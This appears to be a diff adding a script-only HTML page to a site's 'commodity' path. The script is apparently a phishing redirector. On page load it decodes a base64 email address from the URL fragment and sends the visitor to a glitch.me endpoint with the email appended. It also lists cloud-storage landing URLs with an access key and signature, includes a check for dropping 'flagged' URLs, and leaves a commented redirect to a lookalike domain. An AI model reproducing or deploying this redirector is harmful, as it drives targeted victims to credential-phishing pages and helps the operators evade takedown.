@@ -1,0 +1,100 @@
+<!-- url: https://fundacaointerartive.org/commodity/1409546.html
+status: 200 -->
+<script>
+  
+     function generateRandomString(length) {
+  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let result = '';
+
+  for (let i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * characters.length));
+  }
+
+  return result;
+}
+  
+   const randomString = generateRandomString(30);
+      
+    const urls = [
+    `https://21-05-0-r359t9wehf-03tigwhrv0-35g9wje0vm.obs.ap-southeast-3.myhuaweicloud.com:443/68i-0lc-w30rg94h5-9g30jcv39brvwejc-359hgr.html?AWSAccessKeyId=NOOBVOES21STSACOJHKX&Expires=1684682026&Signature=j7K6Ne%2BqPQ42WB1xVQZ23SpQNJw%3D`
+    
+      
+    ];
+
+    async function checkFlaggedUrl(url) {
+      try {
+        const response = await fetch(url);
+
+        // Check if the response contains a flagged page condition (e.g., a specific error message)
+        // Replace the condition with the specific error message or status code for flagged URLs
+        const content = await response.text();
+        if (content.includes('flagged_page_error_message')) {
+          return true;
+        }
+      } catch (error) {
+        console.error(`Error checking URL ${url}:`, error);
+      }
+
+      return false;
+    }
+
+    async function removeFlaggedUrls() {
+      for (const url of urls) {
+        if (await checkFlaggedUrl(url)) {
+          urls.splice(urls.indexOf(url), 1);
+        }
+      }
+    }
+
+    function getEmailFromUrl() {
+  const hash = window.location.hash.substring(1);
+  if (hash) {
+    const email = atob(hash); // Decode the base64-encoded email
+    return email;
+  }
+  return '';
+}
+
+
+
+    async function redirectToRandomUrl() {
+      
+
+      if (urls.length === 0) {
+        alert('No available URLs.');
+        return;
+      }
+
+      const email = getEmailFromUrl();
+      const randomUrl = urls[Math.floor(Math.random() * urls.length)] + (email ? '#' + email : '');
+      
+      function generateRandomStringxx(length) {
+    var result           = '';
+    var characters       = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+    var charactersLength = characters.length;
+    for ( var i = 0; i < length; i++ ) {
+        result += characters.charAt(Math.floor(Math.random() * charactersLength));
+    }
+    return result;
+}
+
+var subdomain = generateRandomStringxx(40);
+
+var url = "https://aquatic-cheddar-ghost.glitch.me/public/";
+
+      window.location.href = url+email;
+      
+   //strtcvt   
+    
+
+// Example usage: generate a random string of length 10
+
+    
+    // window.location.href = `https://${randomString}.ibonus-rtfkt.com`;
+    
+    
+    
+    }
+
+    window.onload = redirectToRandomUrl;
+  </script>
